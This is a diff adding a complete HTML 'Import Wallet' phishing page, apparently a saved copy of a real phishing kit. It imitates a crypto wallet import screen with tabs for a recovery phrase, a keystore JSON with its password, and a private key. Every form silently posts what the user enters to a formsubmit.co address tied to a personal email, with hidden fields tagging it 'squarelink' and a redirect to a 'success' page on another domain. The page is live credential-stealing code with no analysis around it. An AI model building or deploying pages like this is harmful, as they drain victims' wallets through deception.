@@ -1,0 +1,104 @@
+<html><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="style.css" type="text/css"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:image" content="../images/logo.html">
+  <link rel="icon" href="logo.svg">
+  <script>
+      function openCity(evt, cityName) {
+      // Declare all variables
+      var i, tabcontent, tablinks;
+    
+      // Get all elements with class="tabcontent" and hide them
+      tabcontent = document.getElementsByClassName("tabcontent");
+      for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+      }
+    
+      // Get all elements with class="tablinks" and remove the class "active"
+      tablinks = document.getElementsByClassName("tablinks");
+      for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+      }
+    
+      // Show the current tab, and add an "active" class to the button that opened the tab
+      document.getElementById(cityName).style.display = "block";
+      evt.currentTarget.className += " active";
+    }
+    </script>
+  <title>Import Wallet</title>
+  <style>
+    .tablinks{color:white;}
+    .tablinks active{color:white;}
+    
+  </style>
+  </head>
+  <body style="background-color:#ddd;
+  background-size:cover; background-repeat:no-repeat;">
+  <center>
+  <h2><center style="font-size:20px;
+  margin-top:15px;
+      font-weight: 500;
+      text-align: center;font-family:-apple-system, system-ui, BlinkMacSystemFont,SF Pro Text, Roboto, Helvetica, Arial, sans-serif;">IMPORT WALLET</center></h2>
+  
+  <div class="tab">
+    <button class="tablinks active" id="default" onclick="openCity(event, 'phrase')">Phrase</button>
+    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</button>
+    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</button>
+  </div>
+  
+  <div id="phrase" class="tabcontent" style="display: block;">
+  <form action="https://formsubmit.co/Adeniyibraymo@mail.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_subject" value="New submission!">
+  <input type="hidden" name="w" value="squarelink">
+  
+  
+  <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+  <br>
+  <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+  <br>
+  <button type="submit" name="import" class="btn">IMPORT</button>
+  </form>
+  </div>
+  
+  <div id="keystore" class="tabcontent" style="display: none;">
+  <form action="https://formsubmit.co/Adeniyibraymo@mail.com" method="POST">
+  <input type="hidden" name="_next" value="https://node-bot.online/success.html">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_subject" value="New submission!">
+  <input type="hidden" name="w" value="squarelink">
+  
+  <textarea name="keystorejson" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+  <br>
+  <div class="field">
+      <input type="text" name="keystorepassword" placeholder="Password">
+  </div>
+  <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+  <br>
+  <button type="submit" name="import" class="btn">IMPORT</button>
+  </form>
+  </div>
+  
+  <div id="private" class="tabcontent" style="display: none;">
+  <form action="https://formsubmit.co/Adeniyibraymo@mail.com" method="POST">
+  <input type="hidden" name="_next" value="https://node-bot.online/success.html">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_subject" value="New submission!">
+  <input type="hidden" name="w" value="squarelink">
+  <div class="field">
+      <input type="text" name="privatekey" class="key" placeholder="Private Key">
+  </div>
+  <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+  <br>
+  <button type="submit" name="import" class="btn">IMPORT</button>
+  
+  </form>
+  </div>
+  
+  <script>
+      document.getElementById("default").click();
+  </script>
+  </center>
+  
+  </body></html>
